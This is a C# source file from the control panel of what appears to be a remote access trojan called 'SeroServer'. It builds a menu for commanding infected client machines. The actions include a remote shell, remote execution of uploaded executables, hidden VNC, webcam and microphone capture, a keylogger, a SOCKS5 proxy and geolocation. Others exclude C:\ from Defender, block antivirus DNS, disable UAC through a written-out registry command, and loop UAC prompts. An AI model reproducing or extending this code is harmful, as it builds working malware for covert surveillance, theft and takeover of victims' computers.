using System.Windows;
using System.Windows.Controls;
using SeroServer.Net;
using SeroServer.Protocol;
using ContextMenu = System.Windows.Controls.ContextMenu;
using MenuItem = System.Windows.Controls.MenuItem;
using Separator = System.Windows.Controls.Separator;
using Task = System.Threading.Tasks.Task;

namespace SeroServer.UI;

/// <summary>
/// Builds the context menu used on the Online tab's GridClients and inside feature windows.
/// </summary>
internal static class FeatureContextMenu
{
    internal static ContextMenu Build(
        TlsServer server,
        string clientId,
        ServerWindow mainWindow,
        string? excludeWindowType = null)
    {
        var menu = new ContextMenu();

        // ── Administration ──────────────────────────────────────────────
        var admin = MakeParent(Lang.Get("FEAT_GRP_ADMIN"), "SvgImages/Icon Builder/Security_Key.svg");
        admin.Items.Add(MakeItem(Lang.Get("FEAT_REMOTE_SHELL"),    "shell.png", () =>
        {
            var clients = new System.Collections.Generic.List<Data.ConnectedClient>();
            if (server.ConnectedClients.TryGetValue(clientId, out var c)) clients.Add(c);
            mainWindow.OpenFeatureWindow<RemoteShellWindow>(clientId, () => new RemoteShellWindow(server, clients));
        }));
        admin.Items.Add(MakeItem(Lang.Get("FEAT_FILE_MANAGER"),    "SvgImages/Icon Builder/Actions_FolderOpen.svg",     () => mainWindow.OpenFeatureWindow<FileManagerWindow>(clientId,      () => new FileManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem(Lang.Get("FEAT_PROCESS_MGR"),     "processmanager.png",                           () => mainWindow.OpenFeatureWindow<ProcessManagerWindow>(clientId,   () => new ProcessManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem(Lang.Get("FEAT_STARTUP_MGR"),     "SvgImages/Icon Builder/Actions_Clock.svg",          () => mainWindow.OpenFeatureWindow<StartupManagerWindow>(clientId,   () => new StartupManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem(Lang.Get("FEAT_TCP_CONN"),        "SvgImages/Icon Builder/Electronics_Router.svg",     () => mainWindow.OpenFeatureWindow<TcpManagerWindow>(clientId,       () => new TcpManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem(Lang.Get("FEAT_SERVICE_MGR"),     "SvgImages/Icon Builder/Actions_Settings.svg",        () => mainWindow.OpenFeatureWindow<ServiceManagerWindow>(clientId,   () => new ServiceManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem(Lang.Get("FEAT_WINDOW_MGR"),      "SvgImages/Icon Builder/Actions_Window.svg",         () => mainWindow.OpenFeatureWindow<WindowManagerWindow>(clientId,    () => new WindowManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem(Lang.Get("FEAT_REGISTRY_EDITOR"), "registry.png",      () => mainWindow.OpenFeatureWindow<RegistryEditorWindow>(clientId,  () => new RegistryEditorWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem(Lang.Get("FEAT_INSTALLED_APPS"),  "SvgImages/Icon Builder/Shopping_Box.svg",           () => mainWindow.OpenFeatureWindow<InstalledAppsWindow>(clientId,   () => new InstalledAppsWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem(Lang.Get("FEAT_DEVICE_MGR"),      "SvgImages/Icon Builder/Electronics_Mouse.svg",          () => mainWindow.OpenFeatureWindow<DeviceManagerWindow>(clientId,   () => new DeviceManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem(Lang.Get("FEAT_SOCKS5"),          "SvgImages/Icon Builder/Business_World.svg",         () => mainWindow.OpenFeatureWindow<Socks5Window>(clientId,          () => new Socks5Window(server, clientId, clientId))));
        admin.Items.Add(new Separator());
        admin.Items.Add(MakeItem(Lang.Get("FEAT_REMOTE_EXEC"),     "SvgImages/Icon Builder/Actions_Send.svg",           async () =>
        {
            var dlg = new Microsoft.Win32.OpenFileDialog
            {
                Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
                Title  = "Select file to execute on client"
            };
            if (dlg.ShowDialog() != true) return;
            try
            {
                var bytes = await System.IO.File.ReadAllBytesAsync(dlg.FileName);
                var data = new RemoteFileExecData
                {
                    FileName   = System.IO.Path.GetFileName(dlg.FileName),
                    FileBase64 = Convert.ToBase64String(bytes)
                };
                await server.SendToClient(clientId, new Packet
                {
                    Type = PacketType.RemoteFileExec,
                    Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                });
                ServerWindow.ReportGlobalActivity("Remote execute", clientId, "running");
                ServerWindow.LogGlobal($"[ADMIN] Remote execute '{System.IO.Path.GetFileName(dlg.FileName)}' sent to {clientId}.");
            }
            catch (Exception ex)
            {
                ServerWindow.LogGlobal($"[!] Remote execute failed for {clientId}: {ex.Message}");
            }
        }));
        menu.Items.Add(admin);

        // ── Monitoring ──────────────────────────────────────────────────
        var monitoring = MakeParent(Lang.Get("FEAT_GRP_MONITORING"), "SvgImages/Icon Builder/Security_Visibility.svg");
        if (excludeWindowType != "RemoteDesktopWindow")
            monitoring.Items.Add(MakeItem(Lang.Get("FEAT_REMOTE_DESKTOP"), "rdp.png", () => mainWindow.OpenFeatureWindow<RemoteDesktopWindow>(clientId,      () => new RemoteDesktopWindow(server, clientId))));
        if (excludeWindowType != "WebcamWindow")
            monitoring.Items.Add(MakeItem(Lang.Get("FEAT_WEBCAM"),         "SvgImages/Icon Builder/Electronics_Video.svg",          () => mainWindow.OpenFeatureWindow<WebcamWindow>(clientId,             () => new WebcamWindow(server, clientId))));
        if (excludeWindowType != "HvncWindow")
            monitoring.Items.Add(MakeItem(Lang.Get("FEAT_HVNC"),           "SvgImages/Icon Builder/Security_VisibilityOff.svg",     () => mainWindow.OpenFeatureWindow<HvncWindow>(clientId,              () => new HvncWindow(server, clientId))));
        monitoring.Items.Add(MakeItem(Lang.Get("FEAT_MICROPHONE"),         "SvgImages/Icon Builder/Electronics_Microphone.svg",     () => mainWindow.OpenFeatureWindow<MicrophoneWindow>(clientId,        () => new MicrophoneWindow(server, clientId, clientId))));
        if (excludeWindowType != "SpeakerWindow")
            monitoring.Items.Add(MakeItem(Lang.Get("FEAT_SPEAKER"),          "SvgImages/Icon Builder/Electronics_Headphone.svg",      () => mainWindow.OpenFeatureWindow<SpeakerWindow>(clientId,       () => new SpeakerWindow(server, clientId, clientId))));
        if (excludeWindowType != "SpeakToClientWindow")
            monitoring.Items.Add(MakeItem(Lang.Get("FEAT_SPEAK_TO_CLIENT"),  "SvgImages/Icon Builder/Electronics_Volume.svg",         () => mainWindow.OpenFeatureWindow<SpeakToClientWindow>(clientId, () => new SpeakToClientWindow(server, clientId, clientId))));
        monitoring.Items.Add(MakeItem(Lang.Get("FEAT_KEYLOGGER"),          "SvgImages/Icon Builder/Electronics_Keyboard.svg",       () => mainWindow.OpenFeatureWindow<KeyloggerWindow>(clientId,         () => new KeyloggerWindow(server, clientId, clientId))));
        monitoring.Items.Add(new Separator());
        if (excludeWindowType != "GeoWindow")
            monitoring.Items.Add(MakeItem(Lang.Get("FEAT_GEOLOCATION"),      "SvgImages/Icon Builder/Travel_MapPointer.svg",          () => mainWindow.OpenFeatureWindow<GeoWindow>(clientId,           () => new GeoWindow(server, clientId, clientId))));
        monitoring.Items.Add(new Separator());
        monitoring.Items.Add(MakeItem(Lang.Get("FEAT_PERF_MONITOR"),       "SvgImages/Icon Builder/Business_LinearChart.svg",       () => mainWindow.OpenFeatureWindow<PerformanceMonitorWindow>(clientId, () => new PerformanceMonitorWindow(server, clientId, clientId))));
        menu.Items.Add(monitoring);

        // ── Miscellaneous ───────────────────────────────────────────────
        var misc = MakeParent(Lang.Get("FEAT_GRP_MISC"), "SvgImages/Icon Builder/Actions_Options.svg");
        misc.Items.Add(MakeItem(Lang.Get("FEAT_EXCLUDE_DEFENDER"), "defender.png", () =>
        {
            _ = server.SendToClient(clientId, new Packet { Type = PacketType.DefenderExclude, Data = "{}" });
            ServerWindow.ReportGlobalActivity("Exclude C:\\", clientId, "complete");
            ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_EXCLUDE_DEFENDER"), clientId));
        }));
        misc.Items.Add(MakeItem(Lang.Get("FEAT_BLOCK_AV_DNS"), "SvgImages/Icon Builder/Actions_Forbid.svg", () =>
        {
            _ = Task.Run(async () =>
            {
                var cachePath = PluginCache("Block AV DNS");
                if (!System.IO.File.Exists(cachePath))
                { _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] Block AV DNS: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
                var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
                var pkt = new Packet { Type = PacketType.PluginExec, Data = Newtonsoft.Json.JsonConvert.SerializeObject(new PluginExecData { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain", PluginKind = "block_av_dns" }) };
                await server.SendToClient(clientId, pkt);
                _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] Block AV DNS sent to {clientId}."));
            });
        }));
        misc.Items.Add(MakeItem(Lang.Get("FEAT_BLOCK_WSRESET"), "SvgImages/Icon Builder/Actions_Rollback.svg", () =>
        {
            _ = Task.Run(async () =>
            {
                var cachePath = PluginCache("Block Reset");
                if (!System.IO.File.Exists(cachePath))
                { _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] Block WSReset: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
                var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
                var pkt = new Packet { Type = PacketType.PluginExec, Data = Newtonsoft.Json.JsonConvert.SerializeObject(new PluginExecData { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" }) };
                await server.SendToClient(clientId, pkt);
                _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] Block WSReset sent to {clientId}."));
            });
        }));
        misc.Items.Add(MakeItem(Lang.Get("FEAT_DISABLE_UAC"),      "SvgImages/Icon Builder/Security_Unlock.svg",  () =>
        {
            _ = server.SendToClient(clientId, new Packet
            {
                Type = PacketType.AutoTaskShell,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new { Command = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f" })
            });
            ServerWindow.ReportGlobalActivity("Disable UAC", clientId, "running");
            ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_DISABLE_UAC"), clientId));
        }));
        misc.Items.Add(new Separator());
        misc.Items.Add(MakeItem(Lang.Get("FEAT_BOT_KILLER"), "SvgImages/Business Objects/BO_Skull.svg", () =>
        {
            _ = Task.Run(async () =>
            {
                var cachePath = PluginCache("BotKiller");
                if (!System.IO.File.Exists(cachePath))
                { _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] BotKiller: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
                var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
                var pkt = new Packet { Type = PacketType.PluginExec, Data = Newtonsoft.Json.JsonConvert.SerializeObject(new PluginExecData { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" }) };
                await server.SendToClient(clientId, pkt);
                _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] BotKiller sent to {clientId}."));
            });
        }));
        menu.Items.Add(misc);

        // ── Fun ─────────────────────────────────────────────────────────
        var fun = MakeParent(Lang.Get("FEAT_GRP_FUN"), "Resources/Icons/laughing.svg");
        fun.Items.Add(MakeItem(Lang.Get("FEAT_FUN_PANEL"),  "SvgImages/Icon Builder/Shopping_Gift.svg",            () => mainWindow.OpenFeatureWindow<FunWindow>(clientId,     () => new FunWindow(server, clientId, clientId))));
        fun.Items.Add(new Separator());
        fun.Items.Add(MakeItem(Lang.Get("FEAT_TIKTOK_BOT"), "tiktok.png", () => mainWindow.OpenFeatureWindow<TikTokWindow>(clientId, () => new TikTokWindow(server, [clientId]))));
        menu.Items.Add(fun);

        menu.Items.Add(new Separator());

        // ── Client Management ───────────────────────────────────────────
        var mgmt = MakeParent(Lang.Get("FEAT_GRP_CLIENT"), "SvgImages/Business Objects/BO_Customer.svg");
        mgmt.Items.Add(MakeItem(Lang.Get("FEAT_UAC_ELEVATION"),  "SvgImages/Icon Builder/Actions_User.svg",             () =>
        {
            _ = server.SendToClient(clientId, new Packet { Type = PacketType.RequestElevation, Data = "{}" });
            ServerWindow.ReportGlobalActivity("UAC elevation", clientId, "running");
            ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_UAC_ELEVATION"), clientId));
        }));
        mgmt.Items.Add(MakeItem(Lang.Get("FEAT_LOOP_UAC"),       "SvgImages/Icon Builder/Security_WarningCircled1.svg",  () =>
        {
            _ = server.SendToClient(clientId, new Packet { Type = PacketType.RequestElevationLoop, Data = "{}" });
            ServerWindow.ReportGlobalActivity("Loop UAC", clientId, "running");
            ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_LOOP_UAC"), clientId));
        }));
        mgmt.Items.Add(new Separator());
        mgmt.Items.Add(MakeItem(Lang.Get("FEAT_UPDATE_CLIENT"),  "SvgImages/Icon Builder/Actions_Refresh.svg",           async () =>
        {
            var dlg = new Microsoft.Win32.OpenFileDialog
            {
                Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
                Title  = "Select client binary to update"
            };
            if (dlg.ShowDialog() != true) return;
            try
            {
                var fileBytes = await System.IO.File.ReadAllBytesAsync(dlg.FileName);
                var data = new UpdateClientData
                {
                    FileName   = System.IO.Path.GetFileName(dlg.FileName),
                    FileBase64 = Convert.ToBase64String(fileBytes)
                };
                _ = server.SendToClient(clientId, new Packet
                {
                    Type = PacketType.UpdateClient,
                    Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                });
                ServerWindow.ReportGlobalActivity("Update client", clientId, "running");
                ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_UPDATE_CLIENT"), clientId));
            }
            catch { }
        }));
        mgmt.Items.Add(MakeItem(Lang.Get("FEAT_DISCONNECT"),     "SvgImages/Icon Builder/Actions_Remove.svg",            () =>
        {
            _ = server.SendToClient(clientId, new Packet { Type = PacketType.Disconnect, Data = "{}" });
            ServerWindow.ReportGlobalActivity("Disconnect", clientId, "complete");
            ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_DISCONNECT"), clientId));
        }));
        mgmt.Items.Add(MakeItem(Lang.Get("FEAT_UNINSTALL"),      "SvgImages/Icon Builder/Actions_Trash.svg",             () =>
        {
            var dlg = new ConfirmDialog(
                Lang.Get("POPUP_CONFIRM"),
                string.Format(Lang.Get("POPUP_UNINSTALL_CONFIRM"), 1),
                Lang.Get("POPUP_YES"),
                Lang.Get("POPUP_NO"),
                icon: "", iconColor: "#E04040") { Owner = mainWindow };
            if (dlg.ShowDialog() != true) return;
            _ = server.SendToClient(clientId, new Packet { Type = PacketType.Uninstall, Data = "{}" });
            ServerWindow.ReportGlobalActivity("Uninstall", clientId, "complete");
            ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_UNINSTALL"), clientId));
        }));
        mgmt.Items.Add(new Separator());
        mgmt.Items.Add(MakeItem(Lang.Get("FEAT_SET_TAG"),        "SvgImages/Icon Builder/Actions_Label.svg",             () =>
        {
            if (server.ConnectedClients.TryGetValue(clientId, out var c))
            {
                var dlg = new TagDialog(c.Tag);
                if (dlg.ShowDialog() == true)
                {
                    c.Tag = dlg.TagValue;
                    mainWindow.Store.SetTag(c.Hwid, dlg.TagValue);
                }
            }
        }));
        mgmt.Items.Add(MakeItem(Lang.Get("FEAT_VIEW_LOGS"),      "SvgImages/Business Objects/BO_Report.svg",             () =>
        {
            if (server.ConnectedClients.TryGetValue(clientId, out var c)
                && mainWindow.Store.AllClients.TryGetValue(c.Hwid, out var record))
            {
                mainWindow.OpenFeatureWindow<ClientLogWindow>(clientId, () => new ClientLogWindow(record));
            }
        }));
        mgmt.Items.Add(MakeItem(Lang.Get("FEAT_COPY_IP"),        "SvgImages/Icon Builder/Actions_Copy.svg",              () =>
        {
            if (server.ConnectedClients.TryGetValue(clientId, out var c))
                Clipboard.SetText(c.IP);
        }));
        menu.Items.Add(mgmt);

        // Apply the active DX theme every time the menu opens so icons and hover text
        // use the correct palette. Must be done in Opened (after Popup visual tree exists).
        // Also applied to each top-level MenuItem so their IsHighlighted foreground is
        // styled by DX — without this, parent items like "Monitoring" show black text on hover.
        menu.Opened += (_, _) =>
        {
            try
            {
                var theme = DevExpress.Xpf.Core.ApplicationThemeHelper.ApplicationThemeName;
                if (!string.IsNullOrEmpty(theme))
                {
                    DevExpress.Xpf.Core.ThemeManager.SetThemeName(menu, theme);
                    foreach (var item in menu.Items.OfType<MenuItem>())
                    {
                        DevExpress.Xpf.Core.ThemeManager.SetThemeName(item, theme);
                        if (item.Tag is string p && p.Length > 0)
                            item.Icon = MakeIcon(p);
                    }
                }
            }
            catch { }
        };

        // Also re-apply when any top-level sub-menu opens (each sub-menu is a separate Popup).
        foreach (var item in menu.Items.OfType<MenuItem>())
        {
            item.SubmenuOpened += (s, _) =>
            {
                try
                {
                    var theme = DevExpress.Xpf.Core.ApplicationThemeHelper.ApplicationThemeName;
                    if (!string.IsNullOrEmpty(theme) && s is MenuItem mi)
                    {
                        DevExpress.Xpf.Core.ThemeManager.SetThemeName(mi, theme);
                        foreach (var child in mi.Items.OfType<MenuItem>())
                        {
                            DevExpress.Xpf.Core.ThemeManager.SetThemeName(child, theme);
                            if (child.Tag is string p && p.Length > 0)
                                child.Icon = MakeIcon(p);
                        }
                    }
                }
                catch { }
            };
        }

        return menu;
    }

    private static MenuItem MakeParent(string header, string svgPath)
    {
        var mi = new MenuItem { Header = header, Tag = svgPath };
        mi.Icon = MakeIcon(svgPath);
        return mi;
    }

    private static MenuItem MakeItem(string header, string svgPath, Action onClick)
    {
        var mi = new MenuItem { Header = header, Tag = svgPath };
        mi.Icon = MakeIcon(svgPath);
        mi.Click += (_, _) =>
        {
            try { onClick(); }
            catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[FeatureMenu] {header}: {ex.Message}"); }
        };
        return mi;
    }

    private static string PluginCache(string name) => System.IO.Path.Combine(
        AppDomain.CurrentDomain.BaseDirectory, "plugin_cache",
        name.ToLowerInvariant().Replace(" ", "_").Replace("\\", "").Replace(":", "").Replace("/", "_") + ".dll");

    internal static System.Windows.FrameworkElement MakeIcon(string path)
    {
        try
        {
            if (path.EndsWith(".png", StringComparison.OrdinalIgnoreCase))
            {
                var bmp = new System.Windows.Media.Imaging.BitmapImage();
                bmp.BeginInit();
                bmp.UriSource        = new Uri($"pack://application:,,,/{path}");
                bmp.DecodePixelWidth = 16; bmp.DecodePixelHeight = 16;
                bmp.CacheOption      = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
                bmp.EndInit(); bmp.Freeze();
                var img = new System.Windows.Controls.Image { Source = bmp, Width = 16, Height = 16, Stretch = System.Windows.Media.Stretch.Uniform };
                System.Windows.Media.RenderOptions.SetBitmapScalingMode(img, System.Windows.Media.BitmapScalingMode.HighQuality);
                return img;
            }

            string dxNs  = "xmlns:dx=\"http://schemas.devexpress.com/winfx/2008/xaml/core\"";
            string source = path.StartsWith("SvgImages/")
                ? $"{{dx:DXImageExtension '{path}'}}"
                : $"pack://application:,,,/{path}";
            string dxXaml = $"<dx:DXImage {dxNs} Source=\"{source}\" Width=\"16\" Height=\"16\"/>";
            var icon = (System.Windows.FrameworkElement)System.Windows.Markup.XamlReader.Parse(dxXaml);

            // In Office Dark themes, some SVG icon palette colors are too dark against
            // the menu background. Add a white shape-masked overlay to brighten them
            // while preserving their original hue.
            string theme = DevExpress.Xpf.Core.ApplicationThemeHelper.ApplicationThemeName ?? "";
            if (path.StartsWith("SvgImages/") &&
                theme.IndexOf("Dark", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                var maskShape = (System.Windows.FrameworkElement)System.Windows.Markup.XamlReader.Parse(dxXaml);
                var overlay = new System.Windows.Shapes.Rectangle
                {
                    Width = 16, Height = 16, IsHitTestVisible = false,
                    Fill  = new System.Windows.Media.SolidColorBrush(
                                System.Windows.Media.Color.FromArgb(140, 255, 255, 255))
                };
                overlay.OpacityMask = new System.Windows.Media.VisualBrush
                {
                    Visual  = maskShape,
                    Stretch = System.Windows.Media.Stretch.Uniform
                };
                var grid = new System.Windows.Controls.Grid { Width = 16, Height = 16 };
                grid.Children.Add(icon);
                grid.Children.Add(overlay);
                return grid;
            }

            return icon;
        }
        catch
        {
            return new System.Windows.Shapes.Rectangle { Width = 16, Height = 16, Fill = System.Windows.Media.Brushes.Transparent };
        }
    }

    // Walks all ContextMenus in the logical tree of `root` and adds a white brightness
    // overlay over every DXImage icon so they remain visible in Office Dark themes.
    internal static void BrightenMenuIcons(System.Windows.DependencyObject root)
    {
        string theme = DevExpress.Xpf.Core.ApplicationThemeHelper.ApplicationThemeName ?? "";
        if (theme.IndexOf("Dark", StringComparison.OrdinalIgnoreCase) < 0) return;
        WalkAndBrighten(root);
    }

    private static void WalkAndBrighten(System.Windows.DependencyObject element)
    {
        if (element is System.Windows.FrameworkElement fe && fe.ContextMenu != null)
            BrightenItems(fe.ContextMenu.Items);
        foreach (object child in System.Windows.LogicalTreeHelper.GetChildren(element))
            if (child is System.Windows.DependencyObject dep)
                WalkAndBrighten(dep);
    }

    private static void BrightenItems(System.Windows.Controls.ItemCollection items)
    {
        foreach (object obj in items)
        {
            if (obj is not System.Windows.Controls.MenuItem mi) continue;
            if (mi.Icon is DevExpress.Xpf.Core.DXImage dxi)
            {
                double w = dxi.Width > 0 ? dxi.Width : 14;
                double h = dxi.Height > 0 ? dxi.Height : 14;
                mi.Icon = null;
                var grid = new System.Windows.Controls.Grid { Width = w, Height = h };
                grid.Children.Add(dxi);
                grid.Children.Add(new System.Windows.Shapes.Rectangle
                {
                    Width = w, Height = h, IsHitTestVisible = false,
                    Fill  = new System.Windows.Media.SolidColorBrush(
                                System.Windows.Media.Color.FromArgb(140, 255, 255, 255))
                });
                mi.Icon = grid;
            }
            if (mi.Items.Count > 0) BrightenItems(mi.Items);
        }
    }
}
